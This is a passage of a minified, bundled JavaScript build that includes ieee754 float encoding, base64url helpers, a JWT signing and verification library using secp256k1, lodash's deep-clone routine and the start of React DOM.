            if (t instanceof Set && n instanceof Set) {
              if (t.size !== n.size) return !1;
              for (i of t.entries()) if (!n.has(i[0])) return !1;
              return !0;
            }
            if (ArrayBuffer.isView(t) && ArrayBuffer.isView(n)) {
              if ((r = t.length) != n.length) return !1;
              for (i = r; 0 !== i--; ) if (t[i] !== n[i]) return !1;
              return !0;
            }
            if (t.constructor === RegExp)
              return t.source === n.source && t.flags === n.flags;
            if (t.valueOf !== Object.prototype.valueOf)
              return t.valueOf() === n.valueOf();
            if (t.toString !== Object.prototype.toString)
              return t.toString() === n.toString();
            if ((r = (o = Object.keys(t)).length) !== Object.keys(n).length)
              return !1;
            for (i = r; 0 !== i--; )
              if (!Object.prototype.hasOwnProperty.call(n, o[i])) return !1;
            for (i = r; 0 !== i--; ) {
              var s = o[i];
              if (!e(t[s], n[s])) return !1;
            }
            return !0;
          }
          return t !== t && n !== n;
        };
      },
      4038: (e, t) => {
        (t.read = function (e, t, n, r, i) {
          var o,
            s,
            a = 8 * i - r - 1,
            l = (1 << a) - 1,
            c = l >> 1,
            u = -7,
            f = n ? i - 1 : 0,
            h = n ? -1 : 1,
            d = e[t + f];
          for (
            f += h, o = d & ((1 << -u) - 1), d >>= -u, u += a;
            u > 0;
            o = 256 * o + e[t + f], f += h, u -= 8
          );
          for (
            s = o & ((1 << -u) - 1), o >>= -u, u += r;
            u > 0;
            s = 256 * s + e[t + f], f += h, u -= 8
          );
          if (0 === o) o = 1 - c;
          else {
            if (o === l) return s ? NaN : (1 / 0) * (d ? -1 : 1);
            (s += Math.pow(2, r)), (o -= c);
          }
          return (d ? -1 : 1) * s * Math.pow(2, o - r);
        }),
          (t.write = function (e, t, n, r, i, o) {
            var s,
              a,
              l,
              c = 8 * o - i - 1,
              u = (1 << c) - 1,
              f = u >> 1,
              h = 23 === i ? Math.pow(2, -24) - Math.pow(2, -77) : 0,
              d = r ? 0 : o - 1,
              p = r ? 1 : -1,
              g = t < 0 || (0 === t && 1 / t < 0) ? 1 : 0;
            for (
              t = Math.abs(t),
                isNaN(t) || t === 1 / 0
                  ? ((a = isNaN(t) ? 1 : 0), (s = u))
                  : ((s = Math.floor(Math.log(t) / Math.LN2)),
                    t * (l = Math.pow(2, -s)) < 1 && (s--, (l *= 2)),
                    (t += s + f >= 1 ? h / l : h * Math.pow(2, 1 - f)) * l >=
                      2 && (s++, (l /= 2)),
                    s + f >= u
                      ? ((a = 0), (s = u))
                      : s + f >= 1
                      ? ((a = (t * l - 1) * Math.pow(2, i)), (s += f))
                      : ((a = t * Math.pow(2, f - 1) * Math.pow(2, i)),
                        (s = 0)));
              i >= 8;
              e[n + d] = 255 & a, d += p, a /= 256, i -= 8
            );
            for (
              s = (s << i) | a, c += i;
              c > 0;
              e[n + d] = 255 & s, d += p, s /= 256, c -= 8
            );
            e[n + d - p] |= 128 * g;
          });
      },
      1596: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.decode = t.encode = t.unescape = t.escape = t.pad = void 0);
        const r = n(2009);
        function i(e) {
          return `${e}${"=".repeat(4 - (e.length % 4 || 4))}`;
        }
        function o(e) {
          return e.replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
        }
        function s(e) {
          return i(e).replace(/-/g, "+").replace(/_/g, "/");
        }
        (t.pad = i),
          (t.escape = o),
          (t.unescape = s),
          (t.encode = function (e) {
            return o((0, r.fromByteArray)(new TextEncoder().encode(e)));
          }),
          (t.decode = function (e) {
            return new TextDecoder().decode((0, r.toByteArray)(i(s(e))));
          });
      },
      8761: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.cryptoClients = t.SECP256K1Client = void 0);
        const r = n(4294);
        Object.defineProperty(t, "SECP256K1Client", {
          enumerable: !0,
          get: function () {
            return r.SECP256K1Client;
          },
        });
        const i = { ES256K: r.SECP256K1Client };
        t.cryptoClients = i;
      },
      4294: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.SECP256K1Client = void 0);
        const r = n(5968),
          i = n(4304),
          o = n(3845),
          s = n(3377),
          a = n(5034),
          l = n(4361);
        o.utils.hmacSha256Sync = function (e) {
          const t = r.hmac.create(i.sha256, e);
          for (
            var n = arguments.length, o = new Array(n > 1 ? n - 1 : 0), s = 1;
            s < n;
            s++
          )
            o[s - 1] = arguments[s];
          return o.forEach((e) => t.update(e)), t.digest();
        };
        class c {
          static derivePublicKey(e) {
            let t =
              !(arguments.length > 1 && void 0 !== arguments[1]) ||
              arguments[1];
            return (
              66 === e.length && (e = e.slice(0, 64)),
              e.length < 64 && (e = e.padStart(64, "0")),
              (0, l.bytesToHex)(o.getPublicKey(e, t))
            );
          }
          static signHash(e, t) {
            let n =
              arguments.length > 2 && void 0 !== arguments[2]
                ? arguments[2]
                : "jose";
            if (!e || !t)
              throw new a.MissingParametersError(
                "a signing input hash and private key are all required"
              );
            const r = o.signSync(e, t.slice(0, 64), { der: !0, canonical: !1 });
            if ("der" === n) return (0, l.bytesToHex)(r);
            if ("jose" === n) return (0, s.derToJose)(r, "ES256");
            throw Error("Invalid signature format");
          }
          static loadSignature(e) {
            return (0, s.joseToDer)(e, "ES256");
          }
          static verifyHash(e, t, n) {
            if (!e || !t || !n)
              throw new a.MissingParametersError(
                "a signing input hash, der signature, and public key are all required"
              );
            return o.verify(t, e, n, { strict: !1 });
          }
        }
        (t.SECP256K1Client = c), (c.algorithmName = "ES256K");
      },
      2859: function (e, t, n) {
        "use strict";
        var r =
          (this && this.__awaiter) ||
          function (e, t, n, r) {
            return new (n || (n = Promise))(function (i, o) {
              function s(e) {
                try {
                  l(r.next(e));
                } catch (t) {
                  o(t);
                }
              }
              function a(e) {
                try {
                  l(r.throw(e));
                } catch (t) {
                  o(t);
                }
              }
              function l(e) {
                e.done
                  ? i(e.value)
                  : (function (e) {
                      return e instanceof n
                        ? e
                        : new n(function (t) {
                            t(e);
                          });
                    })(e.value).then(s, a);
              }
              l((r = r.apply(e, t || [])).next());
            });
          };
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.hashSha256Async = t.hashSha256 = void 0);
        const i = n(4304);
        function o(e) {
          return (0, i.sha256)(e);
        }
        (t.hashSha256 = o),
          (t.hashSha256Async = function (e) {
            return r(this, void 0, void 0, function* () {
              try {
                if (
                  "undefined" !== typeof crypto &&
                  "undefined" !== typeof crypto.subtle
                ) {
                  const t =
                      "string" === typeof e ? new TextEncoder().encode(e) : e,
                    n = yield crypto.subtle.digest("SHA-256", t);
                  return new Uint8Array(n);
                }
                {
                  const t = n(8971);
                  if (!t.createHash)
                    throw new Error(
                      "`crypto` module does not contain `createHash`"
                    );
                  return Promise.resolve(
                    t.createHash("sha256").update(e).digest()
                  );
                }
              } catch (t) {
                return (
                  console.log(t),
                  console.log(
                    'Crypto lib not found. Neither the global `crypto.subtle` Web Crypto API, nor the or the Node.js `require("crypto").createHash` module is available. Falling back to JS implementation.'
                  ),
                  Promise.resolve(o(e))
                );
              }
            });
          });
      },
      7782: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.decodeToken = void 0);
        const r = n(1596);
        t.decodeToken = function (e) {
          if ("string" === typeof e) {
            const t = e.split(".");
            return {
              header: JSON.parse(r.decode(t[0])),
              payload: JSON.parse(r.decode(t[1])),
              signature: t[2],
            };
          }
          if ("object" === typeof e) {
            if ("string" !== typeof e.payload)
              throw new Error(
                "Expected token payload to be a base64 or json string"
              );
            let t = e.payload;
            "{" !== e.payload[0] && (t = r.decode(t));
            const n = [];
            return (
              e.header.map((e) => {
                const t = JSON.parse(r.decode(e));
                n.push(t);
              }),
              { header: n, payload: JSON.parse(t), signature: e.signature }
            );
          }
        };
      },
      3377: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.joseToDer = t.derToJose = void 0);
        const r = n(2009),
          i = n(1596);
        function o(e) {
          return ((e / 8) | 0) + (e % 8 === 0 ? 0 : 1);
        }
        const s = { ES256: o(256), ES384: o(384), ES512: o(521) };
        function a(e) {
          const t = s[e];
          if (t) return t;
          throw new Error(`Unknown algorithm "${e}"`);
        }
        const l = 128;
        function c(e) {
          if (e instanceof Uint8Array) return e;
          if ("string" === typeof e) return (0, r.toByteArray)((0, i.pad)(e));
          throw new TypeError(
            "ECDSA signature must be a Base64 string or a Uint8Array"
          );
        }
        function u(e, t, n) {
          let r = 0;
          for (; t + r < n && 0 === e[t + r]; ) ++r;
          return e[t + r] >= l && --r, r;
        }
        (t.derToJose = function (e, t) {
          const n = c(e),
            o = a(t),
            s = o + 1,
            u = n.length;
          let f = 0;
          if (48 !== n[f++]) throw new Error('Could not find expected "seq"');
          let h = n[f++];
          if ((h === (1 | l) && (h = n[f++]), u - f < h))
            throw new Error(
              `"seq" specified length of "${h}", only "${u - f}" remaining`
            );
          if (2 !== n[f++])
            throw new Error('Could not find expected "int" for "r"');
          const d = n[f++];
          if (u - f - 2 < d)
            throw new Error(
              `"r" specified length of "${d}", only "${u - f - 2}" available`
            );
          if (s < d)
            throw new Error(
              `"r" specified length of "${d}", max of "${s}" is acceptable`
            );
          const p = f;
          if (((f += d), 2 !== n[f++]))
            throw new Error('Could not find expected "int" for "s"');
          const g = n[f++];
          if (u - f !== g)
            throw new Error(
              `"s" specified length of "${g}", expected "${u - f}"`
            );
          if (s < g)
            throw new Error(
              `"s" specified length of "${g}", max of "${s}" is acceptable`
            );
          const y = f;
          if (((f += g), f !== u))
            throw new Error(
              `Expected to consume entire array, but "${u - f}" bytes remain`
            );
          const w = o - d,
            m = o - g,
            b = new Uint8Array(w + d + m + g);
          for (f = 0; f < w; ++f) b[f] = 0;
          b.set(n.subarray(p + Math.max(-w, 0), p + d), f), (f = o);
          for (const r = f; f < r + m; ++f) b[f] = 0;
          return (
            b.set(n.subarray(y + Math.max(-m, 0), y + g), f),
            (0, i.escape)((0, r.fromByteArray)(b))
          );
        }),
          (t.joseToDer = function (e, t) {
            e = c(e);
            const n = a(t),
              r = e.length;
            if (r !== 2 * n)
              throw new TypeError(
                `"${t}" signatures must be "${2 * n}" bytes, saw "${r}"`
              );
            const i = u(e, 0, n),
              o = u(e, n, e.length),
              s = n - i,
              f = n - o,
              h = 2 + s + 1 + 1 + f,
              d = h < l,
              p = new Uint8Array((d ? 2 : 3) + h);
            let g = 0;
            return (
              (p[g++] = 48),
              d ? (p[g++] = h) : ((p[g++] = 1 | l), (p[g++] = 255 & h)),
              (p[g++] = 2),
              (p[g++] = s),
              i < 0
                ? ((p[g++] = 0), p.set(e.subarray(0, n), g), (g += n))
                : (p.set(e.subarray(i, n), g), (g += n - i)),
              (p[g++] = 2),
              (p[g++] = f),
              o < 0
                ? ((p[g++] = 0), p.set(e.subarray(n), g))
                : p.set(e.subarray(n + o), g),
              p
            );
          });
      },
      5034: (e, t) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.InvalidTokenError = t.MissingParametersError = void 0);
        class n extends Error {
          constructor(e) {
            super(),
              (this.name = "MissingParametersError"),
              (this.message = e || "");
          }
        }
        t.MissingParametersError = n;
        class r extends Error {
          constructor(e) {
            super(),
              (this.name = "InvalidTokenError"),
              (this.message = e || "");
          }
        }
        t.InvalidTokenError = r;
      },
      4563: function (e, t, n) {
        "use strict";
        var r =
            (this && this.__createBinding) ||
            (Object.create
              ? function (e, t, n, r) {
                  void 0 === r && (r = n);
                  var i = Object.getOwnPropertyDescriptor(t, n);
                  (i &&
                    !("get" in i
                      ? !t.__esModule
                      : i.writable || i.configurable)) ||
                    (i = {
                      enumerable: !0,
                      get: function () {
                        return t[n];
                      },
                    }),
                    Object.defineProperty(e, r, i);
                }
              : function (e, t, n, r) {
                  void 0 === r && (r = n), (e[r] = t[n]);
                }),
          i =
            (this && this.__exportStar) ||
            function (e, t) {
              for (var n in e)
                "default" === n ||
                  Object.prototype.hasOwnProperty.call(t, n) ||
                  r(t, e, n);
            };
        Object.defineProperty(t, "__esModule", { value: !0 }),
          i(n(1708), t),
          i(n(3092), t),
          i(n(7782), t),
          i(n(5034), t),
          i(n(8761), t);
      },
      1708: function (e, t, n) {
        "use strict";
        var r =
          (this && this.__awaiter) ||
          function (e, t, n, r) {
            return new (n || (n = Promise))(function (i, o) {
              function s(e) {
                try {
                  l(r.next(e));
                } catch (t) {
                  o(t);
                }
              }
              function a(e) {
                try {
                  l(r.throw(e));
                } catch (t) {
                  o(t);
                }
              }
              function l(e) {
                e.done
                  ? i(e.value)
                  : (function (e) {
                      return e instanceof n
                        ? e
                        : new n(function (t) {
                            t(e);
                          });
                    })(e.value).then(s, a);
              }
              l((r = r.apply(e, t || [])).next());
            });
          };
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.TokenSigner = t.createUnsecuredToken = void 0);
        const i = n(1596),
          o = n(8761),
          s = n(5034),
          a = n(2859);
        function l(e, t) {
          const n = [],
            r = i.encode(JSON.stringify(t));
          n.push(r);
          const o = i.encode(JSON.stringify(e));
          n.push(o);
          return n.join(".");
        }
        t.createUnsecuredToken = function (e) {
          return l(e, { typ: "JWT", alg: "none" }) + ".";
        };
        t.TokenSigner = class {
          constructor(e, t) {
            if (!e || !t)
              throw new s.MissingParametersError(
                "a signing algorithm and private key are required"
              );
            if ("string" !== typeof e)
              throw new Error("signing algorithm parameter must be a string");
            if (((e = e.toUpperCase()), !o.cryptoClients.hasOwnProperty(e)))
              throw new Error("invalid signing algorithm");
            (this.tokenType = "JWT"),
              (this.cryptoClient = o.cryptoClients[e]),
              (this.rawPrivateKey = t);
          }
          header() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : {};
            const t = {
              typ: this.tokenType,
              alg: this.cryptoClient.algorithmName,
            };
            return Object.assign({}, t, e);
          }
          sign(e) {
            let t =
                arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
              n =
                arguments.length > 2 && void 0 !== arguments[2]
                  ? arguments[2]
                  : {};
            const r = this.header(n),
              i = l(e, r),
              o = (0, a.hashSha256)(i);
            return this.createWithSignedHash(e, t, r, i, o);
          }
          signAsync(e) {
            let t =
                arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
              n =
                arguments.length > 2 && void 0 !== arguments[2]
                  ? arguments[2]
                  : {};
            return r(this, void 0, void 0, function* () {
              const r = this.header(n),
                i = l(e, r),
                o = yield (0, a.hashSha256Async)(i);
              return this.createWithSignedHash(e, t, r, i, o);
            });
          }
          createWithSignedHash(e, t, n, r, o) {
            const s = this.cryptoClient.signHash(o, this.rawPrivateKey);
            if (t) {
              return {
                header: [i.encode(JSON.stringify(n))],
                payload: JSON.stringify(e),
                signature: [s],
              };
            }
            return [r, s].join(".");
          }
        };
      },
      3092: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.TokenVerifier = void 0);
        const r = n(1596),
          i = n(8761),
          o = n(5034),
          s = n(2859);
        t.TokenVerifier = class {
          constructor(e, t) {
            if (!e || !t)
              throw new o.MissingParametersError(
                "a signing algorithm and public key are required"
              );
            if ("string" !== typeof e)
              throw "signing algorithm parameter must be a string";
            if (((e = e.toUpperCase()), !i.cryptoClients.hasOwnProperty(e)))
              throw "invalid signing algorithm";
            (this.tokenType = "JWT"),
              (this.cryptoClient = i.cryptoClients[e]),
              (this.rawPublicKey = t);
          }
          verify(e) {
            return "string" === typeof e
              ? this.verifyCompact(e, !1)
              : "object" === typeof e && this.verifyExpanded(e, !1);
          }
          verifyAsync(e) {
            return "string" === typeof e
              ? this.verifyCompact(e, !0)
              : "object" === typeof e
              ? this.verifyExpanded(e, !0)
              : Promise.resolve(!1);
          }
          verifyCompact(e, t) {
            const n = e.split("."),
              r = n[0] + "." + n[1],
              i = (e) => {
                const t = this.cryptoClient.loadSignature(n[2]);
                return this.cryptoClient.verifyHash(e, t, this.rawPublicKey);
              };
            if (t) return (0, s.hashSha256Async)(r).then((e) => i(e));
            {
              const e = (0, s.hashSha256)(r);
              return i(e);
            }
          }
          verifyExpanded(e, t) {
            const n = [e.header.join("."), r.encode(e.payload)].join(".");
            let i = !0;
            const o = (t) => (
              e.signature.map((e) => {
                const n = this.cryptoClient.loadSignature(e);
                this.cryptoClient.verifyHash(t, n, this.rawPublicKey) ||
                  (i = !1);
              }),
              i
            );
            if (t) return (0, s.hashSha256Async)(n).then((e) => o(e));
            {
              const e = (0, s.hashSha256)(n);
              return o(e);
            }
          }
        };
      },
      1016: (e, t, n) => {
        e = n.nmd(e);
        var r = "__lodash_hash_undefined__",
          i = 9007199254740991,
          o = "[object Arguments]",
          s = "[object Boolean]",
          a = "[object Date]",
          l = "[object Function]",
          c = "[object GeneratorFunction]",
          u = "[object Map]",
          f = "[object Number]",
          h = "[object Object]",
          d = "[object Promise]",
          p = "[object RegExp]",
          g = "[object Set]",
          y = "[object String]",
          w = "[object Symbol]",
          m = "[object WeakMap]",
          b = "[object ArrayBuffer]",
          v = "[object DataView]",
          E = "[object Float32Array]",
          S = "[object Float64Array]",
          x = "[object Int8Array]",
          A = "[object Int16Array]",
          k = "[object Int32Array]",
          T = "[object Uint8Array]",
          C = "[object Uint8ClampedArray]",
          I = "[object Uint16Array]",
          O = "[object Uint32Array]",
          B = /\w*$/,
          P = /^\[object .+?Constructor\]$/,
          _ = /^(?:0|[1-9]\d*)$/,
          U = {};
        (U[o] =
          U["[object Array]"] =
          U[b] =
          U[v] =
          U[s] =
          U[a] =
          U[E] =
          U[S] =
          U[x] =
          U[A] =
          U[k] =
          U[u] =
          U[f] =
          U[h] =
          U[p] =
          U[g] =
          U[y] =
          U[w] =
          U[T] =
          U[C] =
          U[I] =
          U[O] =
            !0),
          (U["[object Error]"] = U[l] = U[m] = !1);
        var N = "object" == typeof n.g && n.g && n.g.Object === Object && n.g,
          R = "object" == typeof self && self && self.Object === Object && self,
          L = N || R || Function("return this")(),
          $ = t && !t.nodeType && t,
          H = $ && e && !e.nodeType && e,
          D = H && H.exports === $;
        function M(e, t) {
          return e.set(t[0], t[1]), e;
        }
        function F(e, t) {
          return e.add(t), e;
        }
        function j(e, t, n, r) {
          var i = -1,
            o = e ? e.length : 0;
          for (r && o && (n = e[++i]); ++i < o; ) n = t(n, e[i], i, e);
          return n;
        }
        function z(e) {
          var t = !1;
          if (null != e && "function" != typeof e.toString)
            try {
              t = !!(e + "");
            } catch (n) {}
          return t;
        }
        function K(e) {
          var t = -1,
            n = Array(e.size);
          return (
            e.forEach(function (e, r) {
              n[++t] = [r, e];
            }),
            n
          );
        }
        function W(e, t) {
          return function (n) {
            return e(t(n));
          };
        }
        function V(e) {
          var t = -1,
            n = Array(e.size);
          return (
            e.forEach(function (e) {
              n[++t] = e;
            }),
            n
          );
        }
        var q = Array.prototype,
          G = Function.prototype,
          Y = Object.prototype,
          Z = L["__core-js_shared__"],
          J = (function () {
            var e = /[^.]+$/.exec((Z && Z.keys && Z.keys.IE_PROTO) || "");
            return e ? "Symbol(src)_1." + e : "";
          })(),
          X = G.toString,
          Q = Y.hasOwnProperty,
          ee = Y.toString,
          te = RegExp(
            "^" +
              X.call(Q)
                .replace(/[\\^$.*+?()[\]{}|]/g, "\\$&")
                .replace(
                  /hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g,
                  "$1.*?"
                ) +
              "$"
          ),
          ne = D ? L.Buffer : void 0,
          re = L.Symbol,
          ie = L.Uint8Array,
          oe = W(Object.getPrototypeOf, Object),
          se = Object.create,
          ae = Y.propertyIsEnumerable,
          le = q.splice,
          ce = Object.getOwnPropertySymbols,
          ue = ne ? ne.isBuffer : void 0,
          fe = W(Object.keys, Object),
          he = $e(L, "DataView"),
          de = $e(L, "Map"),
          pe = $e(L, "Promise"),
          ge = $e(L, "Set"),
          ye = $e(L, "WeakMap"),
          we = $e(Object, "create"),
          me = je(he),
          be = je(de),
          ve = je(pe),
          Ee = je(ge),
          Se = je(ye),
          xe = re ? re.prototype : void 0,
          Ae = xe ? xe.valueOf : void 0;
        function ke(e) {
          var t = -1,
            n = e ? e.length : 0;
          for (this.clear(); ++t < n; ) {
            var r = e[t];
            this.set(r[0], r[1]);
          }
        }
        function Te(e) {
          var t = -1,
            n = e ? e.length : 0;
          for (this.clear(); ++t < n; ) {
            var r = e[t];
            this.set(r[0], r[1]);
          }
        }
        function Ce(e) {
          var t = -1,
            n = e ? e.length : 0;
          for (this.clear(); ++t < n; ) {
            var r = e[t];
            this.set(r[0], r[1]);
          }
        }
        function Ie(e) {
          this.__data__ = new Te(e);
        }
        function Oe(e, t) {
          var n =
              Ke(e) ||
              (function (e) {
                return (
                  (function (e) {
                    return (
                      (function (e) {
                        return !!e && "object" == typeof e;
                      })(e) && We(e)
                    );
                  })(e) &&
                  Q.call(e, "callee") &&
                  (!ae.call(e, "callee") || ee.call(e) == o)
                );
              })(e)
                ? (function (e, t) {
                    for (var n = -1, r = Array(e); ++n < e; ) r[n] = t(n);
                    return r;
                  })(e.length, String)
                : [],
            r = n.length,
            i = !!r;
          for (var s in e)
            (!t && !Q.call(e, s)) ||
              (i && ("length" == s || Me(s, r))) ||
              n.push(s);
          return n;
        }
        function Be(e, t, n) {
          var r = e[t];
          (Q.call(e, t) && ze(r, n) && (void 0 !== n || t in e)) || (e[t] = n);
        }
        function Pe(e, t) {
          for (var n = e.length; n--; ) if (ze(e[n][0], t)) return n;
          return -1;
        }
        function _e(e, t, n, r, i, d, m) {
          var P;
          if ((r && (P = d ? r(e, i, d, m) : r(e)), void 0 !== P)) return P;
          if (!Ge(e)) return e;
          var _ = Ke(e);
          if (_) {
            if (
              ((P = (function (e) {
                var t = e.length,
                  n = e.constructor(t);
                t &&
                  "string" == typeof e[0] &&
                  Q.call(e, "index") &&
                  ((n.index = e.index), (n.input = e.input));
                return n;
              })(e)),
              !t)
            )
              return (function (e, t) {
                var n = -1,
                  r = e.length;
                t || (t = Array(r));
                for (; ++n < r; ) t[n] = e[n];
                return t;
              })(e, P);
          } else {
            var N = De(e),
              R = N == l || N == c;
            if (Ve(e))
              return (function (e, t) {
                if (t) return e.slice();
                var n = new e.constructor(e.length);
                return e.copy(n), n;
              })(e, t);
            if (N == h || N == o || (R && !d)) {
              if (z(e)) return d ? e : {};
              if (
                ((P = (function (e) {
                  return "function" != typeof e.constructor || Fe(e)
                    ? {}
                    : ((t = oe(e)), Ge(t) ? se(t) : {});
                  var t;
                })(R ? {} : e)),
                !t)
              )
                return (function (e, t) {
                  return Re(e, He(e), t);
                })(
                  e,
                  (function (e, t) {
                    return e && Re(t, Ye(t), e);
                  })(P, e)
                );
            } else {
              if (!U[N]) return d ? e : {};
              P = (function (e, t, n, r) {
                var i = e.constructor;
                switch (t) {
                  case b:
                    return Ne(e);
                  case s:
                  case a:
                    return new i(+e);
                  case v:
                    return (function (e, t) {
                      var n = t ? Ne(e.buffer) : e.buffer;
                      return new e.constructor(n, e.byteOffset, e.byteLength);
                    })(e, r);
                  case E:
                  case S:
                  case x:
                  case A:
                  case k:
                  case T:
                  case C:
                  case I:
                  case O:
                    return (function (e, t) {
                      var n = t ? Ne(e.buffer) : e.buffer;
                      return new e.constructor(n, e.byteOffset, e.length);
                    })(e, r);
                  case u:
                    return (function (e, t, n) {
                      var r = t ? n(K(e), !0) : K(e);
                      return j(r, M, new e.constructor());
                    })(e, r, n);
                  case f:
                  case y:
                    return new i(e);
                  case p:
                    return (function (e) {
                      var t = new e.constructor(e.source, B.exec(e));
                      return (t.lastIndex = e.lastIndex), t;
                    })(e);
                  case g:
                    return (function (e, t, n) {
                      var r = t ? n(V(e), !0) : V(e);
                      return j(r, F, new e.constructor());
                    })(e, r, n);
                  case w:
                    return (o = e), Ae ? Object(Ae.call(o)) : {};
                }
                var o;
              })(e, N, _e, t);
            }
          }
          m || (m = new Ie());
          var L = m.get(e);
          if (L) return L;
          if ((m.set(e, P), !_))
            var $ = n
              ? (function (e) {
                  return (function (e, t, n) {
                    var r = t(e);
                    return Ke(e)
                      ? r
                      : (function (e, t) {
                          for (
                            var n = -1, r = t.length, i = e.length;
                            ++n < r;

                          )
                            e[i + n] = t[n];
                          return e;
                        })(r, n(e));
                  })(e, Ye, He);
                })(e)
              : Ye(e);
          return (
            (function (e, t) {
              for (
                var n = -1, r = e ? e.length : 0;
                ++n < r && !1 !== t(e[n], n, e);

              );
            })($ || e, function (i, o) {
              $ && (i = e[(o = i)]), Be(P, o, _e(i, t, n, r, o, e, m));
            }),
            P
          );
        }
        function Ue(e) {
          return (
            !(!Ge(e) || ((t = e), J && J in t)) &&
            (qe(e) || z(e) ? te : P).test(je(e))
          );
          var t;
        }
        function Ne(e) {
          var t = new e.constructor(e.byteLength);
          return new ie(t).set(new ie(e)), t;
        }
        function Re(e, t, n, r) {
          n || (n = {});
          for (var i = -1, o = t.length; ++i < o; ) {
            var s = t[i],
              a = r ? r(n[s], e[s], s, n, e) : void 0;
            Be(n, s, void 0 === a ? e[s] : a);
          }
          return n;
        }
        function Le(e, t) {
          var n = e.__data__;
          return (function (e) {
            var t = typeof e;
            return "string" == t ||
              "number" == t ||
              "symbol" == t ||
              "boolean" == t
              ? "__proto__" !== e
              : null === e;
          })(t)
            ? n["string" == typeof t ? "string" : "hash"]
            : n.map;
        }
        function $e(e, t) {
          var n = (function (e, t) {
            return null == e ? void 0 : e[t];
          })(e, t);
          return Ue(n) ? n : void 0;
        }
        (ke.prototype.clear = function () {
          this.__data__ = we ? we(null) : {};
        }),
          (ke.prototype.delete = function (e) {
            return this.has(e) && delete this.__data__[e];
          }),
          (ke.prototype.get = function (e) {
            var t = this.__data__;
            if (we) {
              var n = t[e];
              return n === r ? void 0 : n;
            }
            return Q.call(t, e) ? t[e] : void 0;
          }),
          (ke.prototype.has = function (e) {
            var t = this.__data__;
            return we ? void 0 !== t[e] : Q.call(t, e);
          }),
          (ke.prototype.set = function (e, t) {
            return (this.__data__[e] = we && void 0 === t ? r : t), this;
          }),
          (Te.prototype.clear = function () {
            this.__data__ = [];
          }),
          (Te.prototype.delete = function (e) {
            var t = this.__data__,
              n = Pe(t, e);
            return (
              !(n < 0) && (n == t.length - 1 ? t.pop() : le.call(t, n, 1), !0)
            );
          }),
          (Te.prototype.get = function (e) {
            var t = this.__data__,
              n = Pe(t, e);
            return n < 0 ? void 0 : t[n][1];
          }),
          (Te.prototype.has = function (e) {
            return Pe(this.__data__, e) > -1;
          }),
          (Te.prototype.set = function (e, t) {
            var n = this.__data__,
              r = Pe(n, e);
            return r < 0 ? n.push([e, t]) : (n[r][1] = t), this;
          }),
          (Ce.prototype.clear = function () {
            this.__data__ = {
              hash: new ke(),
              map: new (de || Te)(),
              string: new ke(),
            };
          }),
          (Ce.prototype.delete = function (e) {
            return Le(this, e).delete(e);
          }),
          (Ce.prototype.get = function (e) {
            return Le(this, e).get(e);
          }),
          (Ce.prototype.has = function (e) {
            return Le(this, e).has(e);
          }),
          (Ce.prototype.set = function (e, t) {
            return Le(this, e).set(e, t), this;
          }),
          (Ie.prototype.clear = function () {
            this.__data__ = new Te();
          }),
          (Ie.prototype.delete = function (e) {
            return this.__data__.delete(e);
          }),
          (Ie.prototype.get = function (e) {
            return this.__data__.get(e);
          }),
          (Ie.prototype.has = function (e) {
            return this.__data__.has(e);
          }),
          (Ie.prototype.set = function (e, t) {
            var n = this.__data__;
            if (n instanceof Te) {
              var r = n.__data__;
              if (!de || r.length < 199) return r.push([e, t]), this;
              n = this.__data__ = new Ce(r);
            }
            return n.set(e, t), this;
          });
        var He = ce
            ? W(ce, Object)
            : function () {
                return [];
              },
          De = function (e) {
            return ee.call(e);
          };
        function Me(e, t) {
          return (
            !!(t = null == t ? i : t) &&
            ("number" == typeof e || _.test(e)) &&
            e > -1 &&
            e % 1 == 0 &&
            e < t
          );
        }
        function Fe(e) {
          var t = e && e.constructor;
          return e === (("function" == typeof t && t.prototype) || Y);
        }
        function je(e) {
          if (null != e) {
            try {
              return X.call(e);
            } catch (t) {}
            try {
              return e + "";
            } catch (t) {}
          }
          return "";
        }
        function ze(e, t) {
          return e === t || (e !== e && t !== t);
        }
        ((he && De(new he(new ArrayBuffer(1))) != v) ||
          (de && De(new de()) != u) ||
          (pe && De(pe.resolve()) != d) ||
          (ge && De(new ge()) != g) ||
          (ye && De(new ye()) != m)) &&
          (De = function (e) {
            var t = ee.call(e),
              n = t == h ? e.constructor : void 0,
              r = n ? je(n) : void 0;
            if (r)
              switch (r) {
                case me:
                  return v;
                case be:
                  return u;
                case ve:
                  return d;
                case Ee:
                  return g;
                case Se:
                  return m;
              }
            return t;
          });
        var Ke = Array.isArray;
        function We(e) {
          return (
            null != e &&
            (function (e) {
              return "number" == typeof e && e > -1 && e % 1 == 0 && e <= i;
            })(e.length) &&
            !qe(e)
          );
        }
        var Ve =
          ue ||
          function () {
            return !1;
          };
        function qe(e) {
          var t = Ge(e) ? ee.call(e) : "";
          return t == l || t == c;
        }
        function Ge(e) {
          var t = typeof e;
          return !!e && ("object" == t || "function" == t);
        }
        function Ye(e) {
          return We(e)
            ? Oe(e)
            : (function (e) {
                if (!Fe(e)) return fe(e);
                var t = [];
                for (var n in Object(e))
                  Q.call(e, n) && "constructor" != n && t.push(n);
                return t;
              })(e);
        }
        e.exports = function (e) {
          return _e(e, !0, !0);
        };
      },
      4463: (e, t, n) => {
        "use strict";
        var r = n(2791),
          i = n(5296);
        function o(e) {
          for (
            var t =
                "https://reactjs.org/docs/error-decoder.html?invariant=" + e,
              n = 1;
            n < arguments.length;
            n++
          )
            t += "&args[]=" + encodeURIComponent(arguments[n]);
          return (
            "Minified React error #" +
            e +
            "; visit " +
            t +
            " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
          );
        }
        var s = new Set(),
          a = {};
